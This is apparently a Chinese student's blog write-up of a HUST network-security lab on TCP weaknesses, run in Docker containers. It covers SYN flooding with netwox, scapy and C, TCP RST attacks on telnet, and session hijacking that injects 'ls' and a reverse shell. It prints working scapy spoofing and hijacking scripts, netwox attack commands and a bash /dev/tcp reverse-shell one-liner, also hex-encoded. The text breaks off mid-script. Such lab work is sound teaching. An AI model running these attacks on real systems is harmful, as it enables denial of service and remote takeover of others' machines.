---
layout: post
title: "HUST网安计算机网络安全实验实验一-TCP协议漏洞及利用"
date: 2022-04-17 13:08:23 +0800
description: "本文详细记录了一次网络安全实验，包括使用netwox工具进行SYN Flood攻击，分析了开启和关闭"
keywords: "hust计算机网络安全实验"
categories: ['Hust']
tags: ['计网安全', 'Tcp', 'Scapy', 'Netwox']
artid: "124227412"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=124227412
    alt: "HUST网安计算机网络安全实验实验一-TCP协议漏洞及利用"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=124227412
featuredImagePreview: https://bing.ee123.net/img/rand?artid=124227412
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     【HUST】网安｜计算机网络安全实验｜实验一 TCP协议漏洞及利用
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="./../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="./../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="markdown_views prism-tomorrow-night-eighties" id="content_views">
    <svg style="display: none;" xmlns="http://www.w3.org/2000/svg">
     <path d="M5,0 0,2.5 5,5z" id="raphael-marker-block" stroke-linecap="round" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
     </path>
    </svg>
    <p>
     写在最前：
     <br/>
     <strong>
      实验指导书已经写得非常好了
     </strong>
     ，这是我个人的实验记录，
     <strong>
      并没有认真整理和记录容易出问题的地方
     </strong>
     。只是免得以后忘了什么是netwox还得翻学习通。
     <br/>
    </p>
    <div class="toc">
     <h4>
      文章目录
     </h4>
     <ul>
      <li>
       <a href="#_4" rel="nofollow">
        涉及代码的仓库地址
       </a>
      </li>
      <li>
       <a href="#docker_8" rel="nofollow">
        docker使用
       </a>
      </li>
      <li>
       <ul>
        <li>
         <a href="#_10" rel="nofollow">
          建立实验环境
         </a>
        </li>
        <li>
         <a href="#docker_33" rel="nofollow">
          docker常用指令
         </a>
        </li>
       </ul>
      </li>
      <li>
       <a href="#netwox_59" rel="nofollow">
        netwox工具使用
       </a>
      </li>
      <li>
       <ul>
        <li>
         <a href="#netwox_79" rel="nofollow">
          netwox常用指令的编号
         </a>
        </li>
       </ul>
      </li>
      <li>
       <a href="#_88" rel="nofollow">
        其他常用指令
       </a>
      </li>
      <li>
       <a href="#1_SYNFlooding_140" rel="nofollow">
        任务1 SYN-Flooding攻击
       </a>
      </li>
      <li>
       <ul>
        <li>
         <a href="#_154" rel="nofollow">
          攻击过程
         </a>
        </li>
        <li>
         <ul>
          <li>
           <a href="#cookie_156" rel="nofollow">
            不启用cookie
           </a>
          </li>
          <li>
           <a href="#cookie_198" rel="nofollow">
            打开cookie后
           </a>
          </li>
         </ul>
        </li>
       </ul>
      </li>
      <li>
       <a href="#_2___telnet__ssh__TCP_RST__210" rel="nofollow">
        任务 2 : 针对 telnet 或 ssh 连接的 TCP RST 攻击
       </a>
      </li>
      <li>
       <ul>
        <li>
         <a href="#_212" rel="nofollow">
          攻击过程
         </a>
        </li>
        <li>
         <ul>
          <li>
           <a href="#netwox_214" rel="nofollow">
            netwox：
           </a>
          </li>
          <li>
           <a href="#scapy_230" rel="nofollow">
            scapy手动攻击：
           </a>
          </li>
          <li>
           <a href="#scapy_262" rel="nofollow">
            scapy自动攻击：
           </a>
          </li>
         </ul>
        </li>
       </ul>
      </li>
      <li>
       <a href="#34_288" rel="nofollow">
        任务3,4常用指令说明
       </a>
      </li>
      <li>
       <ul>
        <li>
         <a href="#_290" rel="nofollow">
          打断会话劫持
         </a>
        </li>
        <li>
         <a href="#shell_300" rel="nofollow">
          反弹shell
         </a>
        </li>
       </ul>
      </li>
      <li>
       <a href="#_34___TCP__shell_318" rel="nofollow">
        任务 3,4 : 使用 TCP 会话劫持注入普通命令、创建反向 shell
       </a>
      </li>
      <li>
       <ul>
        <li>
         <a href="#_320" rel="nofollow">
          攻击过程
         </a>
        </li>
        <li>
         <ul>
          <li>
           <a href="#lsrn_324" rel="nofollow">
            注入普通命令"ls\r\n"
           </a>
          </li>
          <li>
           <ul>
            <li>
             <a href="#netwox_326" rel="nofollow">
              netwox：
             </a>
            </li>
            <li>
             <a href="#scapy_354" rel="nofollow">
              scapy：
             </a>
            </li>
           </ul>
          </li>
          <li>
           <a href="#shell_420" rel="nofollow">
            反向shell
           </a>
          </li>
          <li>
           <ul>
            <li>
             <a href="#netwox_422" rel="nofollow">
              netwox：
             </a>
            </li>
            <li>
             <a href="#scapy_450" rel="nofollow">
              scapy：
             </a>
            </li>
           </ul>
          </li>
         </ul>
        </li>
       </ul>
      </li>
     </ul>
    </div>
    <p>
    </p>
    <h2>
     <a id="_4">
     </a>
     涉及代码的仓库地址
    </h2>
    <p>
     <a href="https://gitee.com/shandianchengzi/cse_networksecurity_exp/tree/master/1_TCP%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%88%A9%E7%94%A8" rel="nofollow">
      HUST计算机网络安全实验_Gitee
     </a>
     <br/>
     <a href="https://github.com/shandianchengzi/cse_networksecurity_exp">
      Github
     </a>
    </p>
    <h2>
     <a id="docker_8">
     </a>
     docker使用
    </h2>
    <h3>
     <a id="_10">
     </a>
     建立实验环境
    </h3>
    <p>
     普通用户： seed 密码:dees
     <br/>
     超级用户：root 密码：seedubuntu
    </p>
    <p>
     Network(bridge)：172.17.0.0/16：
    </p>
    <p>
     server是已经创建好的，如果没有，就按照创建User的方式创建。
    </p>
    <p>
     创建user：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> run -it --name<span class="token operator">=</span>user --hostname<span class="token operator">=</span>user --privileged <span class="token string">"seedubuntu"</span> /bin/bash
</code></pre>
    <p>
     我的ip：
    </p>
    <pre><code class="prism language-bash">Attacker：172.17.0.1 <span class="token comment"># 也就是虚拟机seed@VM</span>
server：172.17.0.4
user：172.17.0.2
</code></pre>
    <h3>
     <a id="docker_33">
     </a>
     docker常用指令
    </h3>
    <p>
     打开或停止HostM：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> start/stop HostM
</code></pre>
    <p>
     把HostM映射到bash中：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token builtin class-name">exec</span> -it HostM /bin/bash
</code></pre>
    <p>
     查看当前docker有哪些：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token function">ps</span> -a
</code></pre>
    <p>
     关闭防火墙：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> iptables -F
</code></pre>
    <h2>
     <a id="netwox_59">
     </a>
     netwox工具使用
    </h2>
    <p>
     Netwox是一款非常强大和易用的开源工
     <br/>
     具包，可以创造任意的TCP/UDP/IP数据
     <br/>
     报文。Netwox工具包中包含了超过200
     <br/>
     个不同功能的网络报文生成工具，每个工具
     <br/>
     都拥有一个特定的
     <strong>
      编号
     </strong>
     。
    </p>
    <p>
     指令格式：
    </p>
    <pre><code class="prism language-bash">netwox number 参数
</code></pre>
    <p>
     具体命令可查：
    </p>
    <pre><code class="prism language-bash">netwox number --help
</code></pre>
    <h3>
     <a id="netwox_79">
     </a>
     netwox常用指令的编号
    </h3>
    <p>
     运行netwox，输入3，可以按照关键词搜
     <br/>
     素想要的工具。
     <br/>
      76 Syn-flood工具
     <br/>
      78 TCP RST攻击
     <br/>
      40 TCP会话劫持
     <br/>
      0 退出netwox
    </p>
    <h2>
     <a id="_88">
     </a>
     其他常用指令
    </h2>
    <p>
     ①telnet：
    </p>
    <p>
     开启telnet服务：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> /etc/init.d/openbsd-inetd restart <span class="token comment"># telnet服务启动</span>
<span class="token function">sudo</span> <span class="token function">netstat</span> -a <span class="token operator">|</span> <span class="token function">grep</span> telnet <span class="token comment"># 查看telnet的运行状态</span>
</code></pre>
    <p>
     连接服务器：
    </p>
    <pre><code class="prism language-bash">telnet <span class="token number">172.17</span>.0.4
</code></pre>
    <p>
     ②cookie机制开关：
    </p>
    <p>
     查看cookie是否开启：
    </p>
    <pre><code class="prism language-bash">sysctl -a <span class="token operator">|</span> <span class="token function">grep</span> cookie
</code></pre>
    <p>
     关闭cookie机制：
    </p>
    <pre><code class="prism language-bash">sysctl net.ipv4.tcp_syncookies<span class="token operator">=</span><span class="token number">0</span>
</code></pre>
    <p>
     打开cookie机制：
    </p>
    <pre><code class="prism language-bash">sysctl net.ipv4.tcp_syncookies<span class="token operator">=</span><span class="token number">1</span>
</code></pre>
    <p>
     ③wireshark：
    </p>
    <p>
     新建终端，打开any网卡。
    </p>
    <p>
     <img alt="在这里插入图片描述" src="https://i-blog.csdnimg.cn/blog_migrate/07e6c21305abc0a9314e3746b13822d8.png"/>
    </p>
    <p>
     ④查看当前的连接的状态：
    </p>
    <pre><code class="prism language-bash"><span class="token function">netstat</span> -nat
</code></pre>
    <div>
    </div>
    <h2>
     <a id="1_SYNFlooding_140">
     </a>
     任务1 SYN-Flooding攻击
    </h2>
    <p>
     SYN flood 是DoS攻击的一种。攻击者使用假冒 IP 地址或故意不完成三次握手，利用 TCP 半开连接，预支资源。
    </p>
    <p>
     本实验目标是消耗服务器资源，服务器docker的ip是172.17.0.4。
    </p>
    <p>
     三种实现形式：
    </p>
    <p>
     ①利用netwox工具
    </p>
    <p>
     ②利用scapy
    </p>
    <p>
     ③利用c代码
    </p>
    <h3>
     <a id="_154">
     </a>
     攻击过程
    </h3>
    <h4>
     <a id="cookie_156">
     </a>
     不启用cookie
    </h4>
    <p>
     ①netwox：攻击机运行
     <code>
      sudo netwox 76 172.17.0.4 -p 23
     </code>
     。
    </p>
    <p>
     用户机尝试用telnet连接，连接超时，失败。意思是攻击成功。
    </p>
    <blockquote>
     <p>
      根据@
      <strong>
       qq_51639539
      </strong>
      同学的补充，即使没攻击也可能telnet失败，这是因为没有启动 ftp 和 telnet 服务器。参照实验指导书第三页的启动ftp和telnet服务器的两条命令。
      <br/>
      因此，
      <strong>
       请确保你在没攻击的时候能够成功 telnet，再进行攻击、查看攻击效果
      </strong>
      。
     </p>
    </blockquote>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/0af6a1d7a0ec42d76644af9f15ac2142.png"/>
    </p>
    <p>
     用户机先建立连接，然后再打开攻击。
    </p>
    <p>
     新建用户机终端运行
     <code>
      netstat -nat
     </code>
     查看连接状态：
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/1c5cb0f509059d591cf21fa83ea54f1b.png"/>
    </p>
    <p>
     可以看到，攻击后不影响原有的连接，但是无法新建telnet连接。
    </p>
    <p>
     ②scapy：修改给定脚本的目的地址，攻击机运行
     <code>
      sudo pip install scapy
     </code>
     ，然后攻击机使用
     <code>
      sudo python ./syn_flood.py
     </code>
     运行攻击脚本。
    </p>
    <p>
     运行攻击脚本、用户机telnet尝试连接如下图（左）所示，wireshark截图如下图（右）所示。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/bd12282f59a9917a562f344f9af1c3ea.png"/>
    </p>
    <p>
     可以看到，连接成功，攻击效果不明显。
    </p>
    <p>
     观察wireshark，这是因为python发包速度过慢，因此尝试修改程序，将随机函数删掉，随便写个不随机的遍历函数，但是还是不行。
     <br/>
     因此，我尝试连续运行4个随机的python程序，等待了一分钟，再次建立连接，发现还是没有攻击成功。并且连接速度也没有放慢太多。
    </p>
    <p>
     此时我的虚拟机已经非常卡慢，故不再继续尝试。
    </p>
    <p>
     运行的4个程序见下图（左），攻击的失败结果见下图（右）。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/cc45e4ef77a20f989c5bd2ad35921ce3.png"/>
    </p>
    <p>
     ③c：修改脚本的目的地址，gcc编译，攻击机使用
     <code>
      sudo ./syn_flood
     </code>
     运行攻击脚本。
    </p>
    <p>
     用户机尝试用telnet连接，连接超时，失败。意思是攻击成功。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/16b2492607db92ecd6bb2491d6eac42a.png"/>
    </p>
    <h4>
     <a id="cookie_198">
     </a>
     打开cookie后
    </h4>
    <p>
     以netwox攻击为例。
    </p>
    <p>
     下图左侧是攻击机，正在运行netwox攻击指令；右侧，上方是服务机的cookie机制开启情况，下方是攻击后用户机尝试telnet连接服务机的情况。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/b312d846c61942094a0c51358c21af09.png"/>
    </p>
    <p>
     可以看到，连接没有失败，并且不卡，说明cookie防御机制是有效的。
    </p>
    <div>
    </div>
    <h2>
     <a id="_2___telnet__ssh__TCP_RST__210">
     </a>
     任务 2 : 针对 telnet 或 ssh 连接的 TCP RST 攻击
    </h2>
    <h3>
     <a id="_212">
     </a>
     攻击过程
    </h3>
    <h4>
     <a id="netwox_214">
     </a>
     netwox：
    </h4>
    <p>
     （1）Wireshark截包截图。netwox自动攻击，所以该TCP报文信息用处不大。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/7ad6692c4f61f1965db30144d4f7b6eb.png"/>
    </p>
    <p>
     （2）攻击命令：
     <code>
      sudo netwok 78 -d docker0
     </code>
     。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/cd00c63a2a1cb7c586cb3f538b7afc81.png"/>
    </p>
    <p>
     （3）上图是先建立连接再攻击，攻击成功，telnet连接异常中止，符合预期结果。
    </p>
    <p>
     下图是先攻击再尝试建立连接。可以看到，先是连接时就失败了，再是连接成功后登录时被打断了。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/c4a48a5fe751f1fc07c2339512c77634.png"/>
    </p>
    <h4>
     <a id="scapy_230">
     </a>
     scapy手动攻击：
    </h4>
    <p>
     （1）Wireshark截包截图。
    </p>
    <p>
     关键信息：ip：172.17.0.2→172.17.0.4，port：59252→23，Seq：470998582。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/77af11aff7049ed4df0c2f906048b99d.png"/>
    </p>
    <p>
     （2）攻击脚本：
    </p>
    <pre><code class="prism language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>

<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"SENDING RESET PACKET........."</span><span class="token punctuation">)</span>
ip <span class="token operator">=</span> IP<span class="token punctuation">(</span>src<span class="token operator">=</span><span class="token string">"172.17.0.2"</span><span class="token punctuation">,</span> dst<span class="token operator">=</span><span class="token string">"172.17.0.4"</span><span class="token punctuation">)</span>
tcp <span class="token operator">=</span> TCP<span class="token punctuation">(</span>sport<span class="token operator">=</span><span class="token number">59252</span><span class="token punctuation">,</span> dport<span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">,</span>flags<span class="token operator">=</span><span class="token string">"R"</span><span class="token punctuation">,</span>seq<span class="token operator">=</span><span class="token number">470998582</span><span class="token punctuation">)</span>
pkt <span class="token operator">=</span> ip<span class="token operator">/</span>tcp
ls<span class="token punctuation">(</span>pkt<span class="token punctuation">)</span>
send<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre>
    <p>
     攻击命令：
     <code>
      sudo python reset_manual.py
     </code>
     。
    </p>
    <p>
     （3）观察和解释：成功，符合预期。如下图，图中第二个t对应攻击的tcp报文。当再输入一个t时，显示连接已经中止。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/a32aa89f5ccabe2fc2340f4e5d3f8be2.png"/>
    </p>
    <p>
     而且，使用wireshark抓取报文，可以看到我们伪造的RST报文成功发出、并阻碍了通信。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/c7263802bbd306538cc0d8d8c2a1f1dc.png"/>
    </p>
    <h4>
     <a id="scapy_262">
     </a>
     scapy自动攻击：
    </h4>
    <p>
     （1）Wireshark截包截图。
    </p>
    <p>
     关键信息：ip：172.17.0.2→172.17.0.4，port：59296→23，Seq：107996481。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/f6057e2de8913fa0e9233652e4e8f968.png"/>
    </p>
    <p>
     （2）攻击命令见下图左，攻击脚本见下图右。
    </p>
    <p>
     其中攻击脚本添加了一行判断当前截获的报文是否是RST报文，如果是则返回，以免截取到自己伪造的报文。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/1f5c6393f860164304838b4b2ba1c164.png"/>
    </p>
    <p>
     （3）观察和解释：
    </p>
    <p>
     攻击成功，攻击结果如下图所示。没有阻断telnet与服务器建立连接，但是打断了登录过程。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/42bfa4f3c0f2aaa94dd8471781fb4a97.png"/>
    </p>
    <p>
     这和netwox运行时的部分情况也是一致的，由于建立连接的速度太快，python程序截获到建立连接的TCP报文、并发送伪造的RST报文时，连接已经建立完毕，SEQ和伪造的RST报文对不上。所以是在登录过程中被打断，符合预期。
    </p>
    <p>
     对应的RST报文在wireshark中截图如下。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/cb8551db2887b34d7248f67921bbefbf.png"/>
    </p>
    <h2>
     <a id="34_288">
     </a>
     任务3,4常用指令说明
    </h2>
    <h3>
     <a id="_290">
     </a>
     打断会话劫持
    </h3>
    <p>
     会话劫持之后客户端可能无响应，此时最好用任务2的RST打断telnet会话，这样就不用新建客户端bash。
    </p>
    <p>
     打断方式：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> netwox <span class="token number">78</span> -d docker0
</code></pre>
    <h3>
     <a id="shell_300">
     </a>
     反弹shell
    </h3>
    <p>
     客户端：
     <code>
      nc -lvp 4567
     </code>
    </p>
    <p>
     服务端：
    </p>
    <pre><code class="prism language-bash">/bin/bash -i <span class="token operator">&gt;</span>/dev/tcp/172.17.0.1/4567 <span class="token comment"># 默认描述符1是标准输出，意思是把当前的bash的输出全部重定向到172.17.0.1:4567中</span>
</code></pre>
    <p>
     除了标准输出，还可以把标准输入(0)定向过来、错误输出(2)定向过去。总得来说，指令如下：
    </p>
    <pre><code class="prism language-bash">/bin/bash -i <span class="token operator">&gt;</span>/dev/tcp/172.17.0.1/4567 <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre>
    <div>
    </div>
    <h2>
     <a id="_34___TCP__shell_318">
     </a>
     任务 3,4 : 使用 TCP 会话劫持注入普通命令、创建反向 shell
    </h2>
    <h3>
     <a id="_320">
     </a>
     攻击过程
    </h3>
    <p>
     注：我认为 hijacking_auto.py 是 hijacking_manual.py 的拓展，而且netwox的过程和手动攻击基本一致，没有必要重复展示手动攻击的效果，因此实施scapy攻击时只描述自动攻击及其脚本。
    </p>
    <h4>
     <a id="lsrn_324">
     </a>
     注入普通命令"ls\r\n"
    </h4>
    <h5>
     <a id="netwox_326">
     </a>
     netwox：
    </h5>
    <p>
     （1）Wireshark截包截图：
    </p>
    <p>
     下图是最后一个Telnet报文。
    </p>
    <p>
     关键信息：ip：172.17.0.4→172.17.0.2，port：59366→23，Next SEQ：863211564，ACK：430198591。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/8a540d7f44d3f73a85b546ec19c494d6.png"/>
    </p>
    <p>
     （2）攻击命令：
     <code>
      sudo netwox 40 -l 172.17.0.2 -m 172.17.0.4 -p 23 -o 59366 --tcp-seqnum 430198591 --tcp-acknum 863211564 --tcp-data "6c730d00" --tcp-ack
     </code>
     。
    </p>
    <p>
     注入的内容是"ls\r\n"。
    </p>
    <p>
     （3）观察和解释：攻击成功。
    </p>
    <p>
     下图是服务端返回的ls结果，显示了服务器当前目录下的文件和文件夹。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/1d22053ce66459281efd03ae743afd1b.png"/>
    </p>
    <p>
     不过可惜的是，user用户机对服务器的会话被干扰了，不能继续会话，如下图所示。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/fb588d4806efd30fbc11ccae60d3da65.png"/>
    </p>
    <p>
     这是因为seq和ack顺序关系被破坏。
    </p>
    <blockquote>
     <p>
      我认为该工具应该可以、并且需要达到更好的效果：比如边接收用户机发来的讯息，边允许攻击机持续向服务器发送指令，这只需要设置两个变量暂存seq和ack即可做到。
     </p>
    </blockquote>
    <h5>
     <a id="scapy_354">
     </a>
     scapy：
    </h5>
    <p>
     （1）Wireshark截包截图：
    </p>
    <p>
     攻击的是下面这张图上的TCP报文，由于采取自动攻击的方式，所以seq和ack的具体数值对程序编写来说，并不重要。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/2b79cee192ec25b7dc1f329c553745b9.png"/>
    </p>
    <p>
     （2）攻击脚本：
    </p>
    <pre><code class="prism language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>

SRC <span class="token operator">=</span> <span class="token string">"172.17.0.2"</span>
DST <span class="token operator">=</span> <span class="token string">"172.17.0.4"</span>
PORT <span class="token operator">=</span> <span class="token number">23</span>

<span class="token keyword">def</span> <span class="token function">spoof</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>
  old_ip <span class="token operator">=</span> pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span>
  old_tcp <span class="token operator">=</span> pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>old_tcp<span class="token punctuation">.</span>flags<span class="token operator">!=</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span>

  <span class="token comment">#############################################</span>
  ip <span class="token operator">=</span> IP<span class="token punctuation">(</span> src  <span class="token operator">=</span> old_ip<span class="token punctuation">.</span>src<span class="token punctuation">,</span>
        dst  <span class="token operator">=</span> old_ip<span class="token punctuation">.</span>dst
       <span class="token punctuation">)</span>
  tcp <span class="token operator">=</span> TCP<span class="token punctuation">(</span> sport <span class="token operator">=</span> old_tcp<span class="token punctuation">.</span>sport<span class="token punctuation">,</span>
        dport <span class="token operator">=</span> old_tcp<span class="token punctuation">.</span>dport<span class="token punctuation">,</span>
        seq  <span class="token operator">=</span> old_tcp<span class="token punctuation">.</span>seq<span class="token punctuation">,</span>
        ack  <span class="token operator">=</span> old_tcp<span class="token punctuation">.</span>ack<span class="token punctuation">,</span>
        flags <span class="token operator">=</span> <span class="token string">"PA"</span>
       <span class="token punctuation">)</span>
  data <span class="token operator">=</span> <span class="token string">"ls\r\n"</span>
  <span class="token comment">#############################################</span>

  pkt <span class="token operator">=</span> ip<span class="token operator">/</span>tcp<span class="token operator">/</span>data
  send<span class="token punctuation">(</span>pkt<span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
  ls<span class="token punctuation">(</span>pkt<span class="token punctuation">)</span>
  <span class="token comment">#quit()</span>

f <span class="token operator">=</span> <span class="token string">'tcp and src host {} and dst host {} and dst port {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>SRC<span class="token punctuation">,</span> DST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>
sniff<span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token operator">=</span>f<span class="token punctuation">,</span> prn<span class="token operator">=</span>spoof<span class="token punctuation">)</span>
</code></pre>
    <blockquote>
     <p>
      <strong>
       出于谨慎，我将quit()注释掉，并且只抓flags为A的报文，将自己伪造的报文的flags改成PA。
      </strong>
     </p>
     <p>
      一方面是防止抓到自己伪造的报文造成不必要的循环；
     </p>
     <p>
      另一方面是通过观察，seq和ack符合需要的目标报文的flags往往是A，telnet报文的flags是PA，并且，不能断定两台主机之间只有telnet通信有flags为A的报文，因此不妨将quit()注释掉，多针对几个ACK包。
     </p>
    </blockquote>
    <p>
     （3）观察和解释：
    </p>
    <p>
     用户机运行telnet连接服务机并登录，攻击机运行python脚本，然后用户机输入一个回车，用于触发脚本。
    </p>
    <blockquote>
     <p>
      注意：
      <strong>
       用于触发脚本的符号是回车
      </strong>
      ，空格时服务器没有正常执行ls指令，具体原因不明。后来做反向shell的时候，我使用空格触发，却成功了。
     </p>
    </blockquote>
    <p>
     在wireshark中抓包可以看到我们伪造的报文，如下图所示。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/9f959b47d1bcc16bbc01c6df966e6acc.png"/>
    </p>
    <p>
     并且，可以进一步看到服务器运行ls时显示的结果，如下图所示。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/1747d75272602a1ac4392d9a86529e75.png"/>
    </p>
    <h4>
     <a id="shell_420">
     </a>
     反向shell
    </h4>
    <h5>
     <a id="netwox_422">
     </a>
     netwox：
    </h5>
    <p>
     （1）Wireshark截包截图：
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/9e690adeb397e7379abc1381e9694ed2.png"/>
    </p>
    <p>
     （2）攻击命令：
    </p>
    <p>
     先在攻击机上运行nc -lvp 4567，对4567端口进行监听，等待服务器主动反向shell。
    </p>
    <p>
     然后用户机和服务器建立telnet连接后，攻击机运行如下指令：
    </p>
    <pre><code class="prism language-bash"><span class="token function">sudo</span> netwox <span class="token number">40</span> -l <span class="token number">172.17</span>.0.2 -m <span class="token number">172.17</span>.0.4 -p <span class="token number">23</span> -o <span class="token number">59418</span> --tcp-seqnum <span class="token number">656808919</span> --tcp-acknum <span class="token number">85195549</span> --tcp-data <span class="token string">"2f62696e2f62617368202d69203e2f6465762f7463702f3137322e31372e302e312f3435363720323e263120303c26310d00"</span> --tcp-ack
</code></pre>
    <p>
     这条攻击指令是利用TCP会话劫持运行
     <code>
      /bin/bash -i &gt;/dev/tcp/172.17.0.1/4567 2&gt;&amp;1 0&lt;&amp;1
     </code>
     并回车。
    </p>
    <p>
     运行的这条指令是把当前的bash的标准输出、错误输出全部重定向到172.17.0.1:4567中去，并把172.17.0.1:4567的输入重定向成为当前bash的标准输入。
    </p>
    <p>
     （3）观察和解释：
    </p>
    <p>
     下图上方是攻击机成功获得服务器shell的截图，下方是服务器响应"/bin/bash -i &gt;/dev/tcp/172.17.0.1/4567 2&gt;&amp;1 0&lt;&amp;1"语句的wireshark抓包结果。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/9571bbee4b88b22909e94e9386544fc3.png"/>
    </p>
    <p>
     可以看到，攻击机成功地能够显示标准输出、错误输出，并且还能将自己的输入运行在服务机运行，也就是获得了服务器的bash。
    </p>
    <h5>
     <a id="scapy_450">
     </a>
     scapy：
    </h5>
    <p>
     （1）Wireshark截包截图：
    </p>
    <p>
     攻击的是下面这张图上的TCP报文，由于采取自动攻击的方式，所以seq和ack的具体数值对程序编写来说，并不重要。
    </p>
    <p>
     <img alt="img" src="https://i-blog.csdnimg.cn/blog_migrate/8ce9acc0c0c3e12d581c5a39e45ca96e.png"/>
    </p>
    <p>
     （2）攻击脚本：
    </p>
    <pre><code class="prism language-python"><span class="token comment">#!/usr/bin/python3</span>
<span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span> <span class="token operator">*</span>

SRC <span class="token operator">=</span> <span class="token string">"172.17.0.2"</span>
DST <span class="token operator">=</span> <span class="token string">"172.17.0.4"</span>
PORT <span class="token operator">=</span> <span class="token number">23</span>

<span class="token keyword">def</span> <span class="token function">spoof</span><span class="token punctuation">(</span>pkt<span class="token punctuation">)</span><span class="token punctuation">:</span>
  old_ip <span class="token operator">=</span> pkt<span class="token punctuation">[</span>IP<span class="token punctuation">]</span>
  old_tcp <span class="token operator">=</span> pkt<span class="token punctuation">[</span>TCP<span class="token punctuation">]</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span>old_tcp<span class="token punctuation">.</span>flags<span class="token operator">!=</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span>

  <span class="token comment">#############################################</span>
  ip <span class="token operator">=</span> IP<span class="token punctuation">(</span> src  <span class="token operator">=</span> old_ip<span class="token punctuation">.</span>src<span class="token punctuation">,</span>
        dst  <span class="token operator">=</span> old_ip<span class="token punctuation">.</span>dst
       <span class="token punctuation">)</span>
  tcp <span class="token operator">=</span> TCP<span class="token punctuation">(</span> sport <span class="token operator">=</span> old_tcp<span class="token punctuation">.</span>sport<span class="token punctuation">,</span>
        dport <span class="token operator">=</span> old_tcp<span class="token punctuation">.</span>dport<span class="token punctuation">,</span>
        seq  <span class="token operator">=</span> old_tcp<span class="token punctuation">.</span>seq<span class="token punctuation">,</span>
        ack  <span class="token operator">=</span> old_tcp<span class="token punctuation">.</span>ack<span class="token punctuation">,</span>
        flags <span class="token operator">=</span> <span class="token string">"PA"</span>
       <span class="token punctuation">)</span>
